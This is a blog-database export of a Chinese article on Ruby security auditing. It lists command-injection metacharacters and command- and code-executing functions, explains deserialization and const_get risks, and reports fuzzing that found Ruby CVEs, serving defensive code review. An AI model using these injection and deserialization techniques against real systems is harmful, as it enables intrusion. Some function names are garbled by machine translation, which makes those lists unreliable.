alt=\"截屏2024-03-30 16.58.15\"\n                 ></p>\n"},{"title":"Ruby安全初探","date":"2023-05-02T13:51:13.000Z","excerpt":"Ruby安全初探","_content":"\n## Ruby安全漫谈\n\n随着Ruby越来越流行，Ruby相关的安全问题也逐渐暴露，目前，国内专门介绍Ruby安全的文章较少，本文结合笔者所了解的Ruby安全知识点以及挖掘到的Ruby相关漏洞进行描述，希望能给读者在Ruby代码审计上提供帮助。\n\n## Ruby简介\n\nRuby是一种面向对象、指令式、函数式、动态的通用编程语言。在20世纪90年代中期由日本电脑科学家松本行弘（Matz）设计并开发。Ruby注重简洁和效率，句法优雅，读起来自然，写起来舒适。\n\n## **红宝石安全**\n\n说到Ruby安全不得不提RubyonRails安全，本篇着重关注Ruby本身。Ruby涉及到web安全漏洞几乎囊括其他语言存在的漏洞，例如命令注入漏洞、代码注入漏洞、反序列化漏洞、SQL注入漏洞、XSS漏洞、SSRF漏洞等。但是在具体的漏洞触发上，Ruby又不同于其他语言。\n\n#### **命令注入漏洞**\n\n命令注入漏洞一般是指把外部数据传入system类的函数执行，导致命令注入漏洞。触发命令注入漏洞的链接符号有很多，再配合单双引号可以组合成更多不同的注入条件，例如（linux）：\n\n+   \\`\\`\n+   $\n+   ;\n+   |\n+   &\n+   \\\\n\n\n在审计代码的时候一般会直接搜索能够执行命令的函数，例如：\n\n+   波彭\n+   生成\n+   syscall\n+   系统\n+   exec\n+   开盘3.\\*\n\n而对于Ruby，除了支持这些函数执行命令，还有一些独特执行命令的方式：\n\n+   %x//\n+   \\`\\`\n+   打开\n+   IO.read\n+   IO.write\n+   IO.binread\n+   IO.binwrite\n+   IO.foreach\n+   IO.readlines\n\n%x//和''属于类似system函数，可以把字符串解析为命令：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140851.jpeg)  \n\nopen是Ruby用来操作文件的函数，但是他也支持执行命令，执行传入一个以中划线开头的字符，后面跟着要执行的命令即可：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140284.jpeg)  \n\n除了open函数，IO.read/IO.write/IO.binread/IO.binwrite/IO.foreach/IO.readlines函数也可以以相同的方式执行命令。\n\nopen函数引发的Ruby安全问题：\n\nFile.read函数引发的Ruby安全问题：\n\nIO.readlines函数引发的潜在Ruby安全问题，笔者发现，已被忽略：\n\n#### **代码注入漏洞**\n\n代码注入漏洞一般是由于把外部数据传入eval类函数中执行，导致程序可以执行任意代码。Ruby除了支持eval，还支持class\\_eval、instance\\_eval函数执行代码，区别在于执行代码的上下文环境不同。eval函数导致的代码注入问题与其他语言类似，不再赘述。\n\nRuby除了eval、class\\_eval、instance\\_eval函数，还存在其他可以执行代码的函数：\n\n> 发送\n>\n> \\_\\_send\\_\\_\n>\n> public\\_send\n>\n> const\\_get\n>\n> constantize\n\n##### **send函数**\n\nsend函数是Ruby用来调用符号方法的函数，可以将任何指定的参数传递给它，类似JAVA中的invoke函数，不过它更为灵活，可以接收外部变量，举例：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140660.jpeg)\n\n上述代码中，实例k通过send动态调用了hello办法，假如hello字符串来自外部，便可以传入eval，注入恶意代码，举例：\n\n![](https://image.3001.net/images/20220831/1661940404_630f32b435fb70310edaf.jpg!small)\n\n##### **\\_\\_send\\_\\_函数**\n\n\\_\\_send\\_\\_函数和send函数一样，区别在于当代码有send同名函数时，可以调用\\_\\_send\\_\\_。\n\n##### **public\\_send函数**\n\npublic\\_send和send函数的区别在于send可以调用私有方法。\n\nsend函数引发的Ruby安全问题：\n\n搜索一些不安全的用法：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140078.jpeg)\n\n##### **const\\_get函数**\n\nconst\\_get函数是Ruby用来在模块中获取常量值的函数，它存在一个inherit参数，当设置为true时（默认也为true），会递归向祖先模块查找。它还有另外一个用法，就是当字符串是已载入的类名时，会返回这个类（Ruby中，类名也是常量），类似JAVA的forName函数，常用写法是这样：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140717.jpeg)\n\n代码中，使用const\\_get动态实例化了类，使Ruby更为灵活。但是这样的用法如果使用不当，也会出现安全问题，例如这里（rack-proxy模块）：\n\n![](https://image.3001.net/images/20220831/1661940439_630f32d7ba288888dc941.png!small)\n\n如图，perform\\_request函数在Net：：HTTP模块中搜索HTTP方法类，然后实例化，并传递full\\_path请求路径参数给new函数，HTTP方法和请求路径都是外部可控的，而且const\\_get函数没有限制inherit，默认可以递归查找，在整个空间内实例化任意已载入类，并传递一个可控参数。如果找到合适的利用链，完全可以到达任意代码执行。目前，该问题已在GitHub上被发现并修复。\n\n![](https://image.3001.net/images/20220831/1661940450_630f32e2be9715971cd92.png!small)\n\n实战中已经有人使用此方法实现了代码执行，那就是gitlab的一个漏洞\n\nhttps://hackerone.com/reports/1125425， kramdown模块使用const\\_get函数来动态实例化格式化类，但是没有限制inherit，导致vakzz通过使用一个Redis类的利用链达到了任意代码执行的目的，漏洞报告已经写的非常详细，不再赘述。\n\n##### **constantize**\n\nconstantize同样可以将字符串转化为类，属于RubyonRails中的用法，底层调用的const\\_get函数：\n\n![](https://image.3001.net/images/20220831/1661940748_630f340ccd8c997de601e.jpg!small)\n\n下图中constantize要转化的类和类实例化的参数都可控，如果我们能找到合适的利用链，便可以到达任意代码执行：\n\n#### **反序列化漏洞**\n\n反序列化漏洞是指在把外部传入的不可信字节序列恢复为对象的过程中，未做合适校验，导致攻击者可以利用特定方法，配合利用链，达到任意代码执行的目的。Ruby也有反序列化的函数，同样也存在反序列化漏洞。\n\n##### **元帅反序列化**\n\nMarshal是Ruby用来序列反序列化的模块，Marshal.dump可以把一个对象序列化为字节序，Marshal.load可以把一个字节序反序列化为对象。\n\nMarshal反序列化的利用已有很多篇分析文章，不再赘述。\n\n+   lhttps://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md\n\n使用已经公开的POC测试：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140260.jpeg)\n\n执行POC（ruby-3.0.0）：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140502.jpeg)\n\n搜索一些不安全的用法：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140540.jpeg)\n\n##### **JSON反序列化**\n\nRuby 处理JSON时可能存在反序列化漏洞，但是不是Ruby内置的JSON解析器，而是第三方开发的解析器oj（https://github.com/ohler55/oj）。oj在解析JSON时支持多种数据类型，包括会导致代码执行的Object类型。\n\n使用已经公开的POC测试：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140543.jpeg)\n\n执行POC（ruby-3.0.0）：\n\n![image.php?url=YD_cnt_38_01EP10d8ODcL](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140594.jpeg)\n\noj可以通过设置模式，避免反序列化对象：\n\n![](https://image.3001.net/images/20220831/1661940920_630f34b8b2b08d5d6e8df.jpg!small)\n\n##### **YAML反序列化**\n\nRuby YAML也支持反序列化对象，pysch 4.0之前版本调用YAML.load函数即可反序列化对象，psych 4.0以后需要调用YAML.unsafe\\_load才能反序列化对象。使用已经公开的POC测试：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140202.jpeg)\n\n执行POC（ruby-3.0.0）：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140722.jpeg)  \n\nRuby YAML解析，psych4.0之前可以通过调用save\\_load函数，避免反序列化对象，psych 4.0之后默认load函数就是安全的（https://github.com/ruby/psych/pull/487）。\n\n搜索unsafe\\_load的使用，不一定存在漏洞，需要yaml内容可控才有风险：\n\n![](https://image.3001.net/images/20220831/1661941095_630f3567d7c3fc569c634.png!small)  \n\n#### **正则错用**\n\nRuby正则大体与其他语言一样，只是在个别语法上存在差别，如果没有特别了解研究，按照其他的语言用法套用，就很有可能出现安全问题，例如Ruby在用正则匹配开头和结尾时支持^$的用法，但是支持多行匹配则需要改为\\\\A\\\\Z避免换行绕过。\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140170.jpeg)  \n\n正则错用引发的安全问题：\n\n搜索相关代码，还是有不少错用的：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140475.jpeg)  \n\n#### **FUZZ Ruby解析器**\n\n在学习Ruby反序列化时，想要通过Ruby用C语言实现Marshal，对处理不同数据类型做处理，那么可以对他进行一下FUZZ。\n\nFUZZ使用了AFLplusplus，配置编译Ruby：\n\n> ./configure CC=/opt/AFLplusplus/afl-clang-fast CXX=/opt/AFLplusplus/afl-clang-fast++ --disable-install-doc --disable-install-rdoc --prefix=/usr/local/ruby --enable-debug-env\n>\n> 导出ASAN\\_OPTIONS=“detect\\_leaks=0：abort\\_on\\_error=1：allow\\_user\\_segv\\_handler=0：handle\\_abort=1：符号=0”\n>\n> AFL\\_USE\\_ASAN=1\n\n使用AFLplusplus的deferred instrumentation模式，对Ruby源码main.c文件稍作修改：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140931.jpeg)\n\n样本生成上，可以选取Ruby自带的测试用例，这样可以快速得到比较全面合法的样本，正好在学习Ruby hook的方案，写了一个简单的hook函数，在rubygems.rb文件中加载，劫持Marshal模块，执行自测的同时即可保存下样本。\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140175.jpeg)  \n\n想要FUZZ其他模块也可以用同样办法来获取样本。\n\n经过一段时间的FUZZ，陆陆续续发现了一些漏洞：\n\n1\\. CVE-2022-28738 在onig\\_reg\\_resize中双自由\n\n![](https://image.3001.net/images/20220831/1661941250_630f3602a476e3837ab11.png!small)  \n\n2\\. CVE-2022-28739 strtod 中的堆缓冲区溢出\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140900.jpeg)  \n\n3\\. 全局缓冲区溢出calc\\_tm\\_yday\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140228.jpeg)  \n\n4\\. renumber\\_by\\_map中的动态堆栈缓冲区溢出\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140778.jpeg)  \n\n5\\. JSON.parse 拒绝服务\n\n![](https://image.3001.net/images/20220831/1661941308_630f363c5c3755eb6479d.png!small)  \n\n虽然FUZZ出了一些问题，但是依旧存在很多未解决的问题，比如FUZZ速度、效率、自动化等，未来将继续深入探索研究。\n\n以上是笔者在ruby中的一些学习研究汇总，如有不恰当之处，敬请斧正，一起交流学习。\n\n### **参考链接**\n\n> https://hackerone.com/ruby/hacktivity\n>\n> https://bishopfox.com/blog/ruby-vulnerabilities-exploits\n>\n> https://zenn.dev/ooooooo\\_q/books/rails\\_deserialize\n>\n> http://gavinmiller.io/2016/the-safesty-way-to-constantize/\n>\n> https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md\n>\n> https://www.elttam.com/blog/ruby-deserialization/\n>\n> https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\n>\n> https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions\n\n\n","source":"_posts/Ruby安全初探.md","raw":"---\ntitle: Ruby安全初探\ndate: 2023-05-02 21:51:13\nexcerpt: Ruby安全初探\ncategories: 学习\n---\n\n## Ruby安全漫谈\n\n随着Ruby越来越流行，Ruby相关的安全问题也逐渐暴露，目前，国内专门介绍Ruby安全的文章较少，本文结合笔者所了解的Ruby安全知识点以及挖掘到的Ruby相关漏洞进行描述，希望能给读者在Ruby代码审计上提供帮助。\n\n## Ruby简介\n\nRuby是一种面向对象、指令式、函数式、动态的通用编程语言。在20世纪90年代中期由日本电脑科学家松本行弘（Matz）设计并开发。Ruby注重简洁和效率，句法优雅，读起来自然，写起来舒适。\n\n## **红宝石安全**\n\n说到Ruby安全不得不提RubyonRails安全，本篇着重关注Ruby本身。Ruby涉及到web安全漏洞几乎囊括其他语言存在的漏洞，例如命令注入漏洞、代码注入漏洞、反序列化漏洞、SQL注入漏洞、XSS漏洞、SSRF漏洞等。但是在具体的漏洞触发上，Ruby又不同于其他语言。\n\n#### **命令注入漏洞**\n\n命令注入漏洞一般是指把外部数据传入system类的函数执行，导致命令注入漏洞。触发命令注入漏洞的链接符号有很多，再配合单双引号可以组合成更多不同的注入条件，例如（linux）：\n\n+   \\`\\`\n+   $\n+   ;\n+   |\n+   &\n+   \\\\n\n\n在审计代码的时候一般会直接搜索能够执行命令的函数，例如：\n\n+   波彭\n+   生成\n+   syscall\n+   系统\n+   exec\n+   开盘3.\\*\n\n而对于Ruby，除了支持这些函数执行命令，还有一些独特执行命令的方式：\n\n+   %x//\n+   \\`\\`\n+   打开\n+   IO.read\n+   IO.write\n+   IO.binread\n+   IO.binwrite\n+   IO.foreach\n+   IO.readlines\n\n%x//和''属于类似system函数，可以把字符串解析为命令：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140851.jpeg)  \n\nopen是Ruby用来操作文件的函数，但是他也支持执行命令，执行传入一个以中划线开头的字符，后面跟着要执行的命令即可：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140284.jpeg)  \n\n除了open函数，IO.read/IO.write/IO.binread/IO.binwrite/IO.foreach/IO.readlines函数也可以以相同的方式执行命令。\n\nopen函数引发的Ruby安全问题：\n\nFile.read函数引发的Ruby安全问题：\n\nIO.readlines函数引发的潜在Ruby安全问题，笔者发现，已被忽略：\n\n#### **代码注入漏洞**\n\n代码注入漏洞一般是由于把外部数据传入eval类函数中执行，导致程序可以执行任意代码。Ruby除了支持eval，还支持class\\_eval、instance\\_eval函数执行代码，区别在于执行代码的上下文环境不同。eval函数导致的代码注入问题与其他语言类似，不再赘述。\n\nRuby除了eval、class\\_eval、instance\\_eval函数，还存在其他可以执行代码的函数：\n\n> 发送\n>\n> \\_\\_send\\_\\_\n>\n> public\\_send\n>\n> const\\_get\n>\n> constantize\n\n##### **send函数**\n\nsend函数是Ruby用来调用符号方法的函数，可以将任何指定的参数传递给它，类似JAVA中的invoke函数，不过它更为灵活，可以接收外部变量，举例：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140660.jpeg)\n\n上述代码中，实例k通过send动态调用了hello办法，假如hello字符串来自外部，便可以传入eval，注入恶意代码，举例：\n\n![](https://image.3001.net/images/20220831/1661940404_630f32b435fb70310edaf.jpg!small)\n\n##### **\\_\\_send\\_\\_函数**\n\n\\_\\_send\\_\\_函数和send函数一样，区别在于当代码有send同名函数时，可以调用\\_\\_send\\_\\_。\n\n##### **public\\_send函数**\n\npublic\\_send和send函数的区别在于send可以调用私有方法。\n\nsend函数引发的Ruby安全问题：\n\n搜索一些不安全的用法：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140078.jpeg)\n\n##### **const\\_get函数**\n\nconst\\_get函数是Ruby用来在模块中获取常量值的函数，它存在一个inherit参数，当设置为true时（默认也为true），会递归向祖先模块查找。它还有另外一个用法，就是当字符串是已载入的类名时，会返回这个类（Ruby中，类名也是常量），类似JAVA的forName函数，常用写法是这样：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140717.jpeg)\n\n代码中，使用const\\_get动态实例化了类，使Ruby更为灵活。但是这样的用法如果使用不当，也会出现安全问题，例如这里（rack-proxy模块）：\n\n![](https://image.3001.net/images/20220831/1661940439_630f32d7ba288888dc941.png!small)\n\n如图，perform\\_request函数在Net：：HTTP模块中搜索HTTP方法类，然后实例化，并传递full\\_path请求路径参数给new函数，HTTP方法和请求路径都是外部可控的，而且const\\_get函数没有限制inherit，默认可以递归查找，在整个空间内实例化任意已载入类，并传递一个可控参数。如果找到合适的利用链，完全可以到达任意代码执行。目前，该问题已在GitHub上被发现并修复。\n\n![](https://image.3001.net/images/20220831/1661940450_630f32e2be9715971cd92.png!small)\n\n实战中已经有人使用此方法实现了代码执行，那就是gitlab的一个漏洞\n\nhttps://hackerone.com/reports/1125425， kramdown模块使用const\\_get函数来动态实例化格式化类，但是没有限制inherit，导致vakzz通过使用一个Redis类的利用链达到了任意代码执行的目的，漏洞报告已经写的非常详细，不再赘述。\n\n##### **constantize**\n\nconstantize同样可以将字符串转化为类，属于RubyonRails中的用法，底层调用的const\\_get函数：\n\n![](https://image.3001.net/images/20220831/1661940748_630f340ccd8c997de601e.jpg!small)\n\n下图中constantize要转化的类和类实例化的参数都可控，如果我们能找到合适的利用链，便可以到达任意代码执行：\n\n#### **反序列化漏洞**\n\n反序列化漏洞是指在把外部传入的不可信字节序列恢复为对象的过程中，未做合适校验，导致攻击者可以利用特定方法，配合利用链，达到任意代码执行的目的。Ruby也有反序列化的函数，同样也存在反序列化漏洞。\n\n##### **元帅反序列化**\n\nMarshal是Ruby用来序列反序列化的模块，Marshal.dump可以把一个对象序列化为字节序，Marshal.load可以把一个字节序反序列化为对象。\n\nMarshal反序列化的利用已有很多篇分析文章，不再赘述。\n\n+   lhttps://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md\n\n使用已经公开的POC测试：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140260.jpeg)\n\n执行POC（ruby-3.0.0）：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140502.jpeg)\n\n搜索一些不安全的用法：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140540.jpeg)\n\n##### **JSON反序列化**\n\nRuby 处理JSON时可能存在反序列化漏洞，但是不是Ruby内置的JSON解析器，而是第三方开发的解析器oj（https://github.com/ohler55/oj）。oj在解析JSON时支持多种数据类型，包括会导致代码执行的Object类型。\n\n使用已经公开的POC测试：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140543.jpeg)\n\n执行POC（ruby-3.0.0）：\n\n![image.php?url=YD_cnt_38_01EP10d8ODcL](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140594.jpeg)\n\noj可以通过设置模式，避免反序列化对象：\n\n![](https://image.3001.net/images/20220831/1661940920_630f34b8b2b08d5d6e8df.jpg!small)\n\n##### **YAML反序列化**\n\nRuby YAML也支持反序列化对象，pysch 4.0之前版本调用YAML.load函数即可反序列化对象，psych 4.0以后需要调用YAML.unsafe\\_load才能反序列化对象。使用已经公开的POC测试：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140202.jpeg)\n\n执行POC（ruby-3.0.0）：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140722.jpeg)  \n\nRuby YAML解析，psych4.0之前可以通过调用save\\_load函数，避免反序列化对象，psych 4.0之后默认load函数就是安全的（https://github.com/ruby/psych/pull/487）。\n\n搜索unsafe\\_load的使用，不一定存在漏洞，需要yaml内容可控才有风险：\n\n![](https://image.3001.net/images/20220831/1661941095_630f3567d7c3fc569c634.png!small)  \n\n#### **正则错用**\n\nRuby正则大体与其他语言一样，只是在个别语法上存在差别，如果没有特别了解研究，按照其他的语言用法套用，就很有可能出现安全问题，例如Ruby在用正则匹配开头和结尾时支持^$的用法，但是支持多行匹配则需要改为\\\\A\\\\Z避免换行绕过。\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140170.jpeg)  \n\n正则错用引发的安全问题：\n\n搜索相关代码，还是有不少错用的：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140475.jpeg)  \n\n#### **FUZZ Ruby解析器**\n\n在学习Ruby反序列化时，想要通过Ruby用C语言实现Marshal，对处理不同数据类型做处理，那么可以对他进行一下FUZZ。\n\nFUZZ使用了AFLplusplus，配置编译Ruby：\n\n> ./configure CC=/opt/AFLplusplus/afl-clang-fast CXX=/opt/AFLplusplus/afl-clang-fast++ --disable-install-doc --disable-install-rdoc --prefix=/usr/local/ruby --enable-debug-env\n>\n> 导出ASAN\\_OPTIONS=“detect\\_leaks=0：abort\\_on\\_error=1：allow\\_user\\_segv\\_handler=0：handle\\_abort=1：符号=0”\n>\n> AFL\\_USE\\_ASAN=1\n\n使用AFLplusplus的deferred instrumentation模式，对Ruby源码main.c文件稍作修改：\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140931.jpeg)\n\n样本生成上，可以选取Ruby自带的测试用例，这样可以快速得到比较全面合法的样本，正好在学习Ruby hook的方案，写了一个简单的hook函数，在rubygems.rb文件中加载，劫持Marshal模块，执行自测的同时即可保存下样本。\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140175.jpeg)  \n\n想要FUZZ其他模块也可以用同样办法来获取样本。\n\n经过一段时间的FUZZ，陆陆续续发现了一些漏洞：\n\n1\\. CVE-2022-28738 在onig\\_reg\\_resize中双自由\n\n![](https://image.3001.net/images/20220831/1661941250_630f3602a476e3837ab11.png!small)  \n\n2\\. CVE-2022-28739 strtod 中的堆缓冲区溢出\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140900.jpeg)  \n\n3\\. 全局缓冲区溢出calc\\_tm\\_yday\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140228.jpeg)  \n\n4\\. renumber\\_by\\_map中的动态堆栈缓冲区溢出\n\n![](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140778.jpeg)  \n\n5\\. JSON.parse 拒绝服务\n\n![](https://image.3001.net/images/20220831/1661941308_630f363c5c3755eb6479d.png!small)  \n\n虽然FUZZ出了一些问题，但是依旧存在很多未解决的问题，比如FUZZ速度、效率、自动化等，未来将继续深入探索研究。\n\n以上是笔者在ruby中的一些学习研究汇总，如有不恰当之处，敬请斧正，一起交流学习。\n\n### **参考链接**\n\n> https://hackerone.com/ruby/hacktivity\n>\n> https://bishopfox.com/blog/ruby-vulnerabilities-exploits\n>\n> https://zenn.dev/ooooooo\\_q/books/rails\\_deserialize\n>\n> http://gavinmiller.io/2016/the-safesty-way-to-constantize/\n>\n> https://github.com/haileys/old-website/blob/master/posts/rails-3.2.10-remote-code-execution.md\n>\n> https://www.elttam.com/blog/ruby-deserialization/\n>\n> https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\n>\n> https://bsidessf2018.sched.com/event/E6jC/fuzzing-ruby-and-c-extensions\n\n\n","slug":"Ruby安全初探","published":1,"updated":"2024-04-25T13:56:17.597Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvfb4qr400006676f52l1nta","content":"<h2 id=\"Ruby安全漫谈\"><a href=\"#Ruby安全漫谈\" class=\"headerlink\" title=\"Ruby安全漫谈\"></a>Ruby安全漫谈</h2><p>随着Ruby越来越流行，Ruby相关的安全问题也逐渐暴露，目前，国内专门介绍Ruby安全的文章较少，本文结合笔者所了解的Ruby安全知识点以及挖掘到的Ruby相关漏洞进行描述，希望能给读者在Ruby代码审计上提供帮助。</p>\n<h2 id=\"Ruby简介\"><a href=\"#Ruby简介\" class=\"headerlink\" title=\"Ruby简介\"></a>Ruby简介</h2><p>Ruby是一种面向对象、指令式、函数式、动态的通用编程语言。在20世纪90年代中期由日本电脑科学家松本行弘（Matz）设计并开发。Ruby注重简洁和效率，句法优雅，读起来自然，写起来舒适。</p>\n<h2 id=\"红宝石安全\"><a href=\"#红宝石安全\" class=\"headerlink\" title=\"红宝石安全\"></a><strong>红宝石安全</strong></h2><p>说到Ruby安全不得不提RubyonRails安全，本篇着重关注Ruby本身。Ruby涉及到web安全漏洞几乎囊括其他语言存在的漏洞，例如命令注入漏洞、代码注入漏洞、反序列化漏洞、SQL注入漏洞、XSS漏洞、SSRF漏洞等。但是在具体的漏洞触发上，Ruby又不同于其他语言。</p>\n<h4 id=\"命令注入漏洞\"><a href=\"#命令注入漏洞\" class=\"headerlink\" title=\"命令注入漏洞\"></a><strong>命令注入漏洞</strong></h4><p>命令注入漏洞一般是指把外部数据传入system类的函数执行，导致命令注入漏洞。触发命令注入漏洞的链接符号有很多，再配合单双引号可以组合成更多不同的注入条件，例如（linux）：</p>\n<ul>\n<li>``</li>\n<li>$</li>\n<li>;</li>\n<li>|</li>\n<li>&amp;</li>\n<li>\\n</li>\n</ul>\n<p>在审计代码的时候一般会直接搜索能够执行命令的函数，例如：</p>\n<ul>\n<li>波彭</li>\n<li>生成</li>\n<li>syscall</li>\n<li>系统</li>\n<li>exec</li>\n<li>开盘3.*</li>\n</ul>\n<p>而对于Ruby，除了支持这些函数执行命令，还有一些独特执行命令的方式：</p>\n<ul>\n<li>%x&#x2F;&#x2F;</li>\n<li>``</li>\n<li>打开</li>\n<li>IO.read</li>\n<li>IO.write</li>\n<li>IO.binread</li>\n<li>IO.binwrite</li>\n<li>IO.foreach</li>\n<li>IO.readlines</li>\n</ul>\n<p>%x&#x2F;&#x2F;和’’属于类似system函数，可以把字符串解析为命令：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140851.jpeg\"\n                       \n                 >  </p>\n<p>open是Ruby用来操作文件的函数，但是他也支持执行命令，执行传入一个以中划线开头的字符，后面跟着要执行的命令即可：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140284.jpeg\"\n                       \n                 >  </p>\n<p>除了open函数，IO.read&#x2F;IO.write&#x2F;IO.binread&#x2F;IO.binwrite&#x2F;IO.foreach&#x2F;IO.readlines函数也可以以相同的方式执行命令。</p>\n<p>open函数引发的Ruby安全问题：</p>\n<p>File.read函数引发的Ruby安全问题：</p>\n<p>IO.readlines函数引发的潜在Ruby安全问题，笔者发现，已被忽略：</p>\n<h4 id=\"代码注入漏洞\"><a href=\"#代码注入漏洞\" class=\"headerlink\" title=\"代码注入漏洞\"></a><strong>代码注入漏洞</strong></h4><p>代码注入漏洞一般是由于把外部数据传入eval类函数中执行，导致程序可以执行任意代码。Ruby除了支持eval，还支持class_eval、instance_eval函数执行代码，区别在于执行代码的上下文环境不同。eval函数导致的代码注入问题与其他语言类似，不再赘述。</p>\n<p>Ruby除了eval、class_eval、instance_eval函数，还存在其他可以执行代码的函数：</p>\n<blockquote>\n<p>发送</p>\n<p>__send__</p>\n<p>public_send</p>\n<p>const_get</p>\n<p>constantize</p>\n</blockquote>\n<h5 id=\"send函数\"><a href=\"#send函数\" class=\"headerlink\" title=\"send函数\"></a><strong>send函数</strong></h5><p>send函数是Ruby用来调用符号方法的函数，可以将任何指定的参数传递给它，类似JAVA中的invoke函数，不过它更为灵活，可以接收外部变量，举例：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140660.jpeg\"\n                       \n                 ></p>\n<p>上述代码中，实例k通过send动态调用了hello办法，假如hello字符串来自外部，便可以传入eval，注入恶意代码，举例：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940404_630f32b435fb70310edaf.jpg!small\"\n                       \n                 ></p>\n<h5 id=\"send-函数\"><a href=\"#send-函数\" class=\"headerlink\" title=\"__send__函数\"></a><strong>__send__函数</strong></h5><p>__send__函数和send函数一样，区别在于当代码有send同名函数时，可以调用__send__。</p>\n<h5 id=\"public-send函数\"><a href=\"#public-send函数\" class=\"headerlink\" title=\"public_send函数\"></a><strong>public_send函数</strong></h5><p>public_send和send函数的区别在于send可以调用私有方法。</p>\n<p>send函数引发的Ruby安全问题：</p>\n<p>搜索一些不安全的用法：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140078.jpeg\"\n                       \n                 ></p>\n<h5 id=\"const-get函数\"><a href=\"#const-get函数\" class=\"headerlink\" title=\"const_get函数\"></a><strong>const_get函数</strong></h5><p>const_get函数是Ruby用来在模块中获取常量值的函数，它存在一个inherit参数，当设置为true时（默认也为true），会递归向祖先模块查找。它还有另外一个用法，就是当字符串是已载入的类名时，会返回这个类（Ruby中，类名也是常量），类似JAVA的forName函数，常用写法是这样：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252140717.jpeg\"\n                       \n                 ></p>\n<p>代码中，使用const_get动态实例化了类，使Ruby更为灵活。但是这样的用法如果使用不当，也会出现安全问题，例如这里（rack-proxy模块）：</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940439_630f32d7ba288888dc941.png!small\"\n                       \n                 ></p>\n<p>如图，perform_request函数在Net：：HTTP模块中搜索HTTP方法类，然后实例化，并传递full_path请求路径参数给new函数，HTTP方法和请求路径都是外部可控的，而且const_get函数没有限制inherit，默认可以递归查找，在整个空间内实例化任意已载入类，并传递一个可控参数。如果找到合适的利用链，完全可以到达任意代码执行。目前，该问题已在GitHub上被发现并修复。</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20220831/1661940450_630f32e2be9715971cd92.png!small\"\n                       \n                 ></p>\n<p>实战中已经有人使用此方法实现了代码执行，那就是gitlab的一个漏洞</p>\n<p><a class=\"link\"   href=\"https://hackerone.com/reports/1125425%EF%BC%8C\" >https://hackerone.com/reports/1125425，<i class=\"fas fa-external-link-alt\"></i></a> 